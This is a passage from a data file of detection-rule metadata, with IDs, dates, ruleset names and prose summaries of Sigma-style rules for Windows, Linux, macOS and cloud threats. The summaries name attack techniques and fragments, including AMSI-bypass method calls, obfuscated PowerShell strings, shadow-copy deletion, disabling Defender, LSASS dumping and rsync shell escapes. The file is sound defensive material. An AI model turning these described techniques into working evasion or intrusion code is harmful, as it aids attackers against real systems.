    PAExec, a tool similar to PsExec, allows for remote execution of processes on
    Windows systems. The detection method involves monitoring for specific events
    generated by the Service Control Manager, particularly looking for event ID 7045,
    which signifies a service installation. Additionally, it checks for service names
    and image paths that start with "PAExec-."
  Updated-Date: '2024_09_04'
de96b824-02b0-4241-9356-7e9b47f04bac:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1bc23d41993cca0d7160429cc59e9b28
  Ruleset: emerging-threats
  Summary: This rule detects failed outbound connection attempts to internet-facing
    SMB servers on a Windows machine. Such activity may indicate potential exploitation
    attempts of the security vulnerability identified as CVE-2023-23397. It specifically
    monitors for Event IDs that signal network connection issues, including attempts
    and failures to establish or re-establish connections. The rule uses IP filtering
    to exclude local internal networks and trusted server addresses to reduce false
    positives, though some benign external connections may still trigger alerts and
    require further filtering.
  Updated-Date: '2024_09_03'
deb9b646-a508-44ee-b7c9-d8965921c6b6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f702f0985f8c276e11d04ea262f31d9a
  Ruleset: core
  Summary: This rule detects the use of token obfuscation techniques in PowerShell
    process creation, often employed by tools such as Invoke-Obfuscation to evade
    defenses. This technique involves complex and unusual patterns in command lines,
    such as irregular use of backticks and encoded expressions. Examples include obfuscations
    like "IN`V`o`Ke-eXp`ResSIOn" or commands constructed with string formatting methods.
    The rule aims to identify these patterns while filtering out benign uses of common
    environment variables.
  Updated-Date: '2024_09_03'
ded2b07a-d12f-4284-9b76-653e37b6c8b0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 277753bbdc48f4a6cf1f2294d89e8c43
  Ruleset: sigmahq
  Summary: This rule detects uncommon and potentially suspicious one-liner commands
    that contain both "ping" and "copy" simultaneously. Such command combinations
    are typically used by malware. The rule looks for specific conditions in process
    creation logs on Windows systems, particularly targeting instances where the command
    "ping" and the "copy" command appear together within a single command line, as
    well as specific command line indicators like " -n " or " -y ".
  Updated-Date: '2024_09_04'
dee0a7a3-f200-4112-a99b-952196d81e42:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2622384159bad1d52fd1641d1fd22d8b
  Ruleset: sigmahq
  Summary: This rule detects the execution of "DumpMinitool.exe," a tool that facilitates
    process memory dumping through the use of the "MiniDumpWriteDump" function. The
    detection focuses on identifying instances where this executable is used, by matching
    specific command line parameters and the executable file names. This behavior
    is often associated with defense evasion and credential dumping tactics.
  Updated-Date: '2024_09_04'
dee4af55-1f22-4e1d-a9d2-4bdc7ecb472a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d89b99dfc201eb7df812a54f2ba025d4
  Ruleset: core
  Summary: This rule detects commands that temporarily turn off Volume Snapshots in
    Windows by monitoring processes that contain specific diagnostics and disabling
    parameters in their command lines. This action is typically associated with attempts
    to evade system defenses, particularly via disabling the Volume Shadow Copy Service
    (VSS), which could indicate malicious intent or preparation for ransomware activities.
  Updated-Date: '2024_09_03'
df1f26d3-bea7-4700-9ea2-ad3e990cf90e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 12f7a0e6044871e7733b12a11ef03ce8
  Ruleset: sigmahq
  Summary: This rule detects the execution of scripts using the Node.js executable
    that is packaged with Adobe Creative Cloud. The focus is on identifying any process
    creation events where the Node.js executable, specifically located in the Adobe
    Creative Cloud Experience directory, is invoked. It aims to isolate potentially
    malicious script executions, while excluding instances where legitimate scripts
    stored in the Creative Cloud's JavaScript resources directory are run. Key details
    captured include the processes' image, command line, and parent command line attributes.
  Updated-Date: '2024_09_04'
df3fcaea-2715-4214-99c5-0056ea59eb35:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b623c66d011e0bf52131b5ac8f4ba0ae
  Ruleset: core
  Summary: This rule detects attempts to extract passwords using the 'grep' command
    on Linux systems. It monitors the execution of 'grep' commands that search for
    the term 'password' by analyzing logs from the audit daemon (auditd). This behavior
    is indicative of potential credential access techniques where attackers try to
    locate plaintext passwords in files.
  Updated-Date: '2024_09_03'
df49c691-8026-48dd-94d3-4ba6a79102a8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1b32f1238e2fe2110a930b53fc527f6e
  Ruleset: emerging-threats
  Summary: This rule detects attempts to save, decrypt, and execute the DarkGate Loader
    in the C:\temp directory on Windows systems. DarkGate Loader is associated with
    malicious activity, and its execution might involve files with the suffixes .au3
    or autoit3.exe, suggesting usage of AutoIT scripting. The detection focuses on
    monitoring file and image creation within the C:\temp folder with these specific
    suffixes, which are typically uncommon for legitimate use in such locations.
  Updated-Date: '2024_09_03'
df4dc653-1029-47ba-8231-3c44238cc0ae:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0ac21d4e9bcbb20dedce46831353543a
  Ruleset: sigmahq
  Summary: This rule detects potential persistence mechanisms using Appx DebugPath
    by monitoring changes in specific Windows registry entries related to Universal
    Windows Platform applications. It looks for modifications in registry paths associated
    with "Classes\ActivatableClasses\Package\Microsoft." and checks if these paths
    end with "\DebugPath". Additionally, it monitors registry entries under "\Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\Microsoft."
    that end with "\(Default)". Such alterations can indicate attempts to maintain
    persistence on a system, often employed by malicious actors.
  Updated-Date: '2024_09_04'
df55196f-f105-44d3-a675-e9dfb6cc2f2b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bbf1406f36c0902dca7eae08df7cb15b
  Ruleset: core
  Summary: This rule detects the use of a renamed Adfind.exe, which is commonly seen
    in many breaches. AdFind is utilized for domain trust discovery, aiding attackers
    in planning subsequent steps in their attack chain. It triggers on specific command-line
    arguments related to domain trust and reconnaissance activities, as well as certain
    file hashes and original filenames associated with AdFind.
  Updated-Date: '2024_09_03'
df69cb1d-b891-4cd9-90c7-d617d90100ce:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e75c96cc6b3b1702dbc1ab40a1119517
  Ruleset: sigmahq
  Summary: This rule detects attempts of decoding a base64 Gzip archive within a PowerShell
    script. This technique is commonly used to load malicious content into memory
    subsequently, leveraging methods like "FromBase64String," "MemoryStream," and
    possibly indicating the base64-encoded Gzip data with "H4sI." The detection is
    aimed at identifying potentially harmful activities often related to command-and-control
    operations.
  Updated-Date: '2024_09_04'
df6ecb8b-7822-4f4b-b412-08f524b4576c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c0991ef66036480b04ea6cf98629711
  Ruleset: sigmahq
  Summary: This rule detects the creation of system DLL files that are typically not
    found on the system, particularly within system directories. This activity is
    often indicative of an attempt to perform DLL hijacking, a technique used for
    defense evasion, persistence, and privilege escalation. Specific DLLs being monitored
    include system files like TSMSISrv.dll, TSVIPSrv.dll, WlbsCtrl.dll, and others
    located in the \Windows\System32 directory and its subdirectories.
  Updated-Date: '2024_09_04'
df9a0e0e-fedb-4d6c-8668-d765dfc92aa7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a841a9893a9b609c9c658a96fb1c948b
  Ruleset: sigmahq
  Summary: This rule detects suspicious activities involving the WSMAN provider when
    PowerShell.exe is not used as the host application. This can indicate unusual
    or unauthorized usage of the Windows Remote Management (WinRM) COM interface,
    which can be a potential indicator of lateral movement techniques utilized by
    malicious actors. The rule focuses on the presence of 'ProviderName=WSMan' in
    data logs and ensures it excludes instances where PowerShell is the host application,
    accounting for variations in PowerShell's execution paths.
  Updated-Date: '2024_09_04'
dfb5b4e8-91d0-4291-b40a-e3b0d3942c45:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5655f9eba8d6993d8687201cc7e46edf
  Ruleset: sigmahq
  Summary: This rule detects potential persistence mechanisms or privilege escalation
    attempts through modifications to the Windows Shim Database. Application shims,
    part of the Microsoft Windows Application Compatibility Infrastructure, enable
    backward compatibility of software. By identifying changes to registry paths associated
    with installed and custom shims, this rule helps to uncover malicious activities
    where adversaries execute harmful content triggered by these application shims.
    Legitimate custom shim installations may also trigger this detection.
  Updated-Date: '2024_09_04'
dfd2fcb7-8bd5-4daa-b132-5adb61d6ad45:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d2644207bcd7f66bcf60ea2e4cd7733b
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Windows Management Instrumentation
    Command-line (wmic.exe) with the "qfe" flag to gather information about installed
    hotfix updates on a system. This behavior is typically utilized by penetration
    testers and attacker enumeration scripts to perform reconnaissance on software
    vulnerabilities and system updates.
  Updated-Date: '2024_09_04'
dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8778a1d42c7f0169b30f550bc7a0c95d
  Ruleset: sigmahq
  Summary: This rule detects instances where a shell process, such as `bash.exe`,
    `cmd.exe`, `powershell.exe`, or `pwsh.exe`, is spawned by the `java.exe` process.
    This activity can indicate potential exploitation attempts, such as those associated
    with log4j vulnerabilities. By monitoring process creation, particularly when
    `java.exe` initiates these shell commands, the rule identifies suspicious behavior
    that might signify an attack vector used for initial access, persistence, or privilege
    escalation on Windows systems.
  Updated-Date: '2024_09_04'
e01b6eb5-1eb4-4465-a165-85d40d874add:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ab6bc7f8360ec4aa165030c931553a24
  Ruleset: emerging-threats
  Summary: This rule detects the creation of processes executed by a user named "ANONYMOUS,"
    a characteristic activity associated with the "MileStone2016" variant of the COLDSTEEL
    Remote Access Trojan (RAT). The detection focuses on processes originating from
    specific directories such as '\Windows\System32\' and '\AppData\'. This behavior
    is indicative of persistence and defense evasion techniques employed by this malware,
    highlighting an emerging threat within Windows environments.
  Updated-Date: '2024_09_03'
e01fa958-6893-41d4-ae03-182477c5e77d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 877023e5c0f859f521f7c6cff1a41489
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Remote Utilities Remote Access Tool
    (RURAT) from an unusual location outside the typical 'C:\Program Files' directory.
    This behavior may indicate unauthorized or malicious use of the remote access
    software, potentially for defense evasion purposes. Monitoring for such activity
    helps identify possible security threats where legitimate software is used from
    non-standard paths.
  Updated-Date: '2024_09_04'
e021bbb5-407f-41f5-9dc9-1864c45a7a51:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 67bb258e5f3872395349ea5347b8bf1a
  Ruleset: sigmahq
  Summary: This rule detects the deployment of an AppX package that was blocked by
    the local computer policy on Windows. It monitors specific events from the AppXDeployment-Server
    service, indicated by EventIDs 441, 442, 453, and 454, to identify instances where
    the deployment was prevented due to policy restrictions.
  Updated-Date: '2024_09_04'
e032f5bc-4563-4096-ae3b-064bab588685:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f21faaf61e98dd518e2fd854976d7201
  Ruleset: core
  Summary: This rule detects a potential local file read vulnerability in applications
    based on the Java Virtual Machine (JVM). It identifies exceptions caused by user
    input that may include path traversal payloads, which can be indicative of an
    attempted exploitation. This type of issue often surfaces in error logs when specific
    keywords like 'FileNotFoundException' and path traversal sequences such as '/../../..'
    are present. It serves as a warning for potential security breaches, although
    there may be false positives related to application bugs.
  Updated-Date: '2024_09_03'
e043f529-8514-4205-8ab0-7f7d2927b400:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ef58cd4ed6e62fb8fb60e01e921f4892
  Ruleset: sigmahq
  Summary: This rule detects DNS queries to "azurewebsites.net" made by non-browser
    processes on a Windows system. The domain "azurewebsites.net" has been frequently
    utilized by threat actors as a malware hosting and data exfiltration site. The
    rule ensures that these queries are not originating from well-known browser executables
    such as Chrome, Firefox, Internet Explorer, Edge, Safari, and others, thereby
    narrowing down potential malicious activities outside the context of regular web
    browsing.
  Updated-Date: '2024_09_04'
e074832a-eada-4fd7-94a1-10642b130e16:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ebd6d0144384176316c6a4ba0b91e86d
  Ruleset: core
  Summary: This rule detects the default filename "debug.bin" in the Temp directory,
    which is indicative of an LSASS dump created by the SafetyKatz tool. SafetyKatz
    is a credential-dumping tool that extracts sensitive information from the Local
    Security Authority Subsystem Service (LSASS).
  Updated-Date: '2024_09_03'
e0813366-0407-449a-9869-a2db1119dc41:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a4829500a19d5c7211361299d33363a1
  Ruleset: core
  Summary: This rule detects a suspicious printer driver installation where the Manufacturer
    value is empty, which could indicate a potential privilege escalation attempt
    or exploitation of CVE-2021-1675. It monitors specific registry paths related
    to printer environments and drivers on Windows systems. The rule filters out known
    legitimate entries such as those related to CutePDF Writer, VNC Printer, and PDF24
    to avoid false positives. However, legitimate printer drivers that do not provide
    details in the Manufacturer value could also trigger this alert. The rule emphasizes
    detecting anomalies in printer driver installations that may pose security risks.
  Updated-Date: '2024_09_03'
e09aed7a-09e0-4c9a-90dd-f0d52507347e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bea884378f4597ceffee80c4cddb7ede
  Ruleset: core
  Summary: This rule detects the WebDAV DownloadCradle by observing HTTP GET requests
    that use the Microsoft-WebDAV-MiniRedir user agent. The detection focuses on identifying
    unusual activities related to command-and-control communication through WebDAV,
    which could indicate malicious events such as data exfiltration or unauthorized
    access. Potential false positives include administrative scripts downloading files
    from the Internet or retrieving website contents, as well as legitimate WebDAV
    administration activities.
  Updated-Date: '2024_09_03'
e09eb557-96d2-4de9-ba2d-30f712a5afd3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fbc1af93a6d399729d88f1aad78853e8
  Ruleset: core
  Summary: This rule detects specific commands used to remove or clear the syslog
    on Linux systems. These commands include various forms of the 'rm' command to
    delete the syslog file, as well as the 'mv' command to move it, and redirection
    operators to empty the log. Such activity is often associated with attempts to
    cover tracks and can indicate malicious behavior. False positives may occur due
    to legitimate log rotation activities.
  Updated-Date: '2024_09_03'
e0a41412-c69a-446f-8e6e-0e6d7483dad7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a9808de898fc5960dfcdeb8edec1d7ce
  Ruleset: emerging-threats
  Summary: This rule detects files created during the local privilege exploitation
    of CVE-2022-24527 in Microsoft Connected Cache. Specifically, it identifies instances
    where files end with 'WindowsPowerShell\Modules\webAdministration\webAdministration.psm1'
    and ensures the user does not contain certain language settings to reduce false
    positives. This vulnerability allows an attacker to elevate privileges on a system,
    posing a significant security risk if exploited.
  Updated-Date: '2024_09_03'
e0b06658-7d1d-4cd3-bf15-03467507ff7c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 380ae635f19ae0463cb7f50be9b4ef44
  Ruleset: core
  Summary: This rule detects the creation of Usage Log files by the Common Language
    Runtime (CLR) module, clr.dll, which are named after the executing process once
    an assembly executes for the first time in the user session context. The logs
    are associated with various executables, such as cmstp.exe, cscript.exe, mshta.exe,
    msxsl.exe, regsvr32.exe, rundll32.exe, svchost.exe, wscript.exe, and wmic.exe.
    Additionally, it identifies potential evasion techniques by filtering out specific
    false positives involving rundll32.exe with particular command-line patterns and
    parent process conditions. The detection aims to identify suspicious activity,
    particularly for defense evasion tactics as highlighted in referenced security
    analysis.
  Updated-Date: '2024_09_03'
e0b0c2ab-3d52-46d9-8cb7-049dc775fbd1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ad87f455f2f9c1ad6d48be9bfe84cdbb
  Ruleset: sigmahq
  Summary: This rule detects adversaries searching the Windows Registry on compromised
    systems for insecurely stored credentials. The Windows Registry is a database
    that stores low-level settings for the operating system and for applications that
    opt to use the Registry. Adversaries may query the Registry to find credentials
    and passwords stored for other programs or services' use. The detection focuses
    on processes where 'reg.exe' is used to query specific Registry keys or values,
    especially those indicating standard or insecure storage locations for sensitive
    information.
  Updated-Date: '2024_09_04'
e0c69ebd-b54f-4aed-8ae3-e3467843f3f0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6620b2365d16a6525de65db20cc1c9ff
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Cloudflared binary that has been
    renamed. Cloudflared is a command-line tool developed by Cloudflare, utilized
    for establishing secure tunnels between servers and the Cloudflare network. The
    rule looks for specific command line arguments and hash values associated with
    Cloudflared operations such as tunnel setup, credential handling, and other functionalities.
    It also checks for known filenames associated with Cloudflared to filter out legitimate
    uses and focuses on identifying unexpected or suspicious activity which may indicate
    unauthorized or malicious use.
  Updated-Date: '2024_09_04'
e0cfaecd-602d-41af-988d-f6ccebb2af26:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2f461cb695ac6fa6e9adb775ee5068fb
  Ruleset: sigmahq
  Summary: This rule detects the execution of suspicious child processes initiated
    by a macOS installer package parent process. The monitoring focuses on processes
    such as osascript, JXA, curl, and wget among other interpreters, which may be
    executed from specific files like `package_script_service` or `installer`. It
    specifically looks for command lines containing 'preinstall' or 'postinstall'.
    This is designed to identify potentially malicious activities that leverage these
    interpreters to execute unwanted commands or scripts during the installation process.
    Legitimate software may also use these scripts, so false positives are possible.
  Updated-Date: '2024_09_04'
e0d1ad53-c7eb-48ec-a87a-72393cc6cedc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5a06078c54707e53542cb747b59fdbe4
  Ruleset: sigmahq
  Summary: This rule detects the installation of the Mesh Agent service on a Windows
    system. Mesh Agent is software used for remotely managing computers. It specifically
    looks for events where the Service Control Manager records the installation of
    a service and checks if the service name or image path contains 'Mesh Agent'.
    Although legitimate uses of the tool exist, this activity might indicate command-and-control
    tactics associated with malicious operations.
  Updated-Date: '2024_09_04'
e0d6c087-2d1c-47fd-8799-3904103c5a98:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e5c1a0815881423412a2dec3b940b175
  Ruleset: core
  Summary: This rule detects code fragments associated with attempts to bypass the
    Anti-Malware Scan Interface (AMSI) in PowerShell scripts. It specifically looks
    for the presence of certain keywords and method calls, such as '[Ref].Assembly.GetType',
    'SetValue($null,$true)', and 'NonPublic,Static', which are indicative of techniques
    used to evade AMSI detection by manipulating PowerShell assemblies. These obfuscation
    tactics are commonly employed to execute malicious scripts without being intercepted
    by security measures.
  Updated-Date: '2024_09_03'
e0f8ab85-0ac9-423b-a73a-81b3c7b1aa97:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9a6645018f827ea1050dc6002eb83c50
  Ruleset: core
  Summary: This rule detects executables located in potentially suspicious directories
    initiating network connections towards file-sharing domains. The rule focuses
    on processes that are executed from various specific directories, such as $Recycle.bin,
    Perflogs, Temp, and several Windows system folders, which are known for being
    used by malicious actors to hide their activities. The rule identifies network
    connections directed towards commonly used file-sharing services and domains,
    including GitHub, Discord, Dropbox, Mediafire, Mega, and Pastebin, among others.
    These connections might indicate data exfiltration or other malicious communication
    associated with command-and-control activities. Although some false positives
    may occur with legitimate installers, which download additional content from GitHub,
    these instances should be baselined for accurate detection.
  Updated-Date: '2024_09_03'
e1118a8f-82f5-44b3-bb6b-8a284e5df602:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f66db19aee6e62e2dd75e3a43a656706
  Ruleset: emerging-threats
  Summary: This rule detects the creation of scheduled tasks using specific command-line
    parameters often associated with ACTINIUM-related persistence activities on Windows
    systems. It identifies the use of 'schtasks' to create tasks that invoke 'wscript'
    with ' /e:vbscript', which is a known method used by ACTINIUM to maintain persistence.
    This activity is flagged due to its high likelihood of being related to malicious
    behavior targeting organizations, particularly highlighted by recent threats to
    Ukrainian entities.
  Updated-Date: '2024_09_03'
e1212b32-55ff-4dfb-a595-62b572248056:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 98b86875523b78f66fae5e355b384d4f
  Ruleset: emerging-threats
  Summary: This rule detects file creation activity associated with the Diamond Sleet
    Advanced Persistent Threat (APT). It focuses on identifying specific filenames
    created in the `ProgramData` directory, such as `4800-84DC-063A6A41C5C`, `clip.exe`,
    `DSROLE.dll`, `Forest64.exe`, `readme.md`, `Version.dll`, and `wsmprovhost.exe`.
    These files are potentially indicative of malevolent actions linked to the Diamond
    Sleet APT, particularly in the context of threats outlined by recent security
    findings involving North Korean threat actors exploiting the TeamCity CVE-2023-42793
    vulnerability.
  Updated-Date: '2024_09_03'
e13f668e-7f95-443d-98d2-1816a7648a7b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 974823f16d607564afab0bf4ce0970b4
  Ruleset: sigmahq
  Summary: This rule detects attempts to enumerate installed software on Windows systems
    by monitoring for specific command-line activities associated with the 'reg.exe'
    tool. Adversaries might use this process to identify software and its versions,
    potentially revealing vulnerable applications or security measures within the
    compromised system. The detection focuses on command lines querying the software
    registry path and looking for specific version information.
  Updated-Date: '2024_09_04'
e1561947-b4e3-4a74-9bdd-83baed21bdb5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 99eb283c038064dfd2f641db9bb64f57
  Ruleset: core
  Summary: This rule detects obfuscated PowerShell usage in scripts by identifying
    the use of Clip.exe in conjunction with commands that manipulate the clipboard.
    Obfuscation techniques include irregular capitalization and the use of unexpected
    characters to conceal the commands' true intent. The rule primarily focuses on
    patterns where `echo` commands are followed by `clip`, and subsequent operations
    involve the system clipboard or invoke clipboard-related methods. This technique
    is commonly associated with obfuscation and execution tactics utilized by attackers.
  Updated-Date: '2024_09_03'
e15b518d-b4ce-4410-a9cd-501f23ce4a18:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aba45df5f7d20ad5c8adc59d7b35e07e
  Ruleset: core
  Summary: This rule detects the execution of colorcpl.exe, which copies an arbitrary
    file to the C:\Windows\System32\spool\drivers\color\ directory. This behavior
    is flagged due to its association with defense evasion techniques, specifically
    in scenarios where an attacker might utilize this method to hide malicious files.
  Updated-Date: '2024_09_03'
e1693bc8-7168-4eab-8718-cdcaa68a1738:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 94f1937a94681a539d9e765564b7f2ac
  Ruleset: core
  Summary: This rule detects the execution of the Windows Management Instrumentation
    Command (WMIC) by an Office application such as Word, Excel, or PowerPoint. The
    activity typically involves invoking WMIC to proxy execution through a living-off-the-land
    binary (LOLBIN), which is a technique often used for evading security measures
    by breaking the suspicious parent-child process chain. This method is commonly
    associated with advanced threats, including ransomware like Sodinokibi (REvil),
    leveraging legitimate Windows utilities to bypass defenses. The rule specifically
    looks for Office processes spawning WMIC executions that include commands associated
    with typical LOLBIN usage.
  Updated-Date: '2024_09_03'
e16cf0f0-ee88-4901-bd0b-4c8d13d9ee05:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b280cbf9ae8d037a140b282f25b98858
  Ruleset: sigmahq
  Summary: This rule detects the deletion of a global secret scanning rule within
    Bitbucket. The activity being monitored falls under global administration actions,
    specifically the removal of rules designated for secret scanning. This can be
    indicative of attempts at defense evasion by removing safeguards designed to detect
    sensitive information within repositories. The detection relies on audit logs
    that require a "Basic" log level to capture such events.
  Updated-Date: '2024_09_04'
e17121b4-ef2a-4418-8a59-12fb1631fa9e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 521a5e46498edbfedebba17f15ea9651
  Ruleset: core
  Summary: This rule detects the deletion of Windows Volume Shadow Copies using PowerShell
    in conjunction with the Get-WMIObject cmdlet. This technique is commonly employed
    by various ransomware families, including Sodinokibi/REvil, to remove shadow copies
    and hinder recovery efforts.
  Updated-Date: '2024_09_03'
e173ad47-4388-4012-ae62-bd13f71c18a8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 982f1a10666c812a71c9aa326a96325b
  Ruleset: sigmahq
  Summary: This rule detects the use of the PhoneDeepLink parameter, which is employed
    to potentially sideload a DLL file named "ShellChromeAPI.dll" that does not exist.
    Adversaries can exploit this by dropping their own maliciously renamed DLL and
    executing it via DeviceEnroller.exe using this parameter. DeviceEnroller.exe is
    associated with Microsoft Windows, and this specific technique is indicative of
    an attacker's attempt at defense evasion by abusing legitimate processes for malicious
    purposes.
  Updated-Date: '2024_09_04'
e1aa95de-610a-427d-b9e7-9b46cfafbe6a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5aa661fb2977f1f53597158b31ecea7a
  Ruleset: sigmahq
  Summary: This rule detects modifications to the Windows registry that disable the
    Windows Defender service (WinDefend). Such actions are indicative of attempts
    by an attacker or tool to evade defenses by stopping the antivirus service, which
    can severely compromise system security. Disabling Windows Defender is a common
    tactic used by malware, including ransomware like IcedID and XingLocker, to avoid
    detection and remain undisturbed during malicious activities. The registry change
    specifically monitored by this rule involves setting the Start value of the WinDefend
    service to 4 (disabled).
  Updated-Date: '2024_09_04'
e1d02b53-c03c-4948-b11d-4d00cca49d03:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ac88f1faa451f740279d671365d3d810
  Ruleset: sigmahq
  Summary: This rule detects an increase of 10% or more in failed authentication attempts
    across any sign-in types within an Azure environment. The primary focus is to
    identify potential security threats or unusual activities that may indicate compromised
    user accounts.
  Updated-Date: '2024_09_04'
e1e0b7d7-e10b-4ee4-ac49-a4bda05d320d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 360c188b4b663f5099f0b0ba2ce062e8
  Ruleset: core
  Summary: This rule detects the usage of Gpg4win, a software package for file encryption
    and digital signatures using the GNU Privacy Guard (GnuPG), to encrypt or decrypt
    files located in potentially suspicious locations on Windows systems. These locations
    include directories such as \PerfLogs\, \Temp\, \Users\Public\, \Windows\Temp\,
    \AppData\Local\Temp\, and \AppData\Roaming\. The detection is based on the creation
    of processes involving gpg.exe or gpg2.exe with command lines that contain the
    '-passphrase' parameter, suggesting encryption or decryption activities. The rule
    aims to identify potentially malicious activities where sensitive data might be
    encrypted or decrypted in directories commonly associated with malware storage
    or temporary files.
  Updated-Date: '2024_09_03'
e212d415-0e93-435f-9e1a-f29005bb4723:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e2571711e23c7b517593d0b0b79c2537
  Ruleset: core
  Summary: This rule detects a suspicious child process spawning from Outlook where
    the image of the child process is located in a remote location such as SMB or
    WebDav shares. This could indicate malicious activity as attackers might leverage
    remote resources to execute harmful code via Outlook.
  Updated-Date: '2024_09_03'
e218595b-bbe7-4ee5-8a96-f32a24ad3468:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f87764407debd5493d8af763afb5e7f7
  Ruleset: core
  Summary: This rule detects a suspicious execution of the curl process on Windows,
    specifically when the curl executable (curl.exe) is used to download files and
    output them to a local system directory. The rule identifies potentially malicious
    behavior by focusing on process creation instances where the command line contains
    paths associated with user data, temporary files, or public directories, such
    as AppData, Desktop, Temp, and ProgramData folders. Additionally, the rule filters
    for suspicious file extensions commonly associated with malware, including .dll,
    .gif, .jpeg, .jpg, .png, .temp, .tmp, .txt, .vbe, and .vbs. Certain benign cases,
    such as specific usage patterns by Git for Windows, are excluded to reduce false
    positives. This detection is critical for identifying command-and-control activities
    or other unauthorized data transfers.
  Updated-Date: '2024_09_03'
e22a6eb2-f8a5-44b5-8b44-a2dbd47b1144:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 24f4d125eacfd7acc439100910bb824d
  Ruleset: core
  Summary: This rule detects the execution of `msiexec.exe` from an uncommon directory,
    indicating potential masquerading activities. Since `msiexec.exe` is inherently
    associated with the Windows Installer service, it should typically run from standard
    directories like `C:\Windows\System32\` or `C:\Windows\SysWOW64\`. Execution from
    non-standard paths may signify an attempt to evade defense mechanisms by disguising
    malicious activities as legitimate system processes.
  Updated-Date: '2024_09_03'
e2326866-609f-4015-aea9-7ec634e8aa04:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 07ce9137b0f4f38036c36de500ffe7e8
  Ruleset: sigmahq
  Summary: This rule detects the use of the "rsync" utility to execute a shell on
    Linux systems, which can be indicative of privilege escalation, unauthorized command
    execution, or attempts to break out from restricted environments. The detection
    focuses on the process creation logs where the "rsync" utility is invoked with
    specific command line options that redirect input and output, typically involving
    "sh" to create a shell. Additionally, the rule identifies command lines that include
    references to "/dev/null", suggesting attempts to conceal outputs.
  Updated-Date: '2024_09_04'
e2482f8d-3443-4237-b906-cc145d87a076:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d479884eb0b49b9fbfda1a92117f1a19
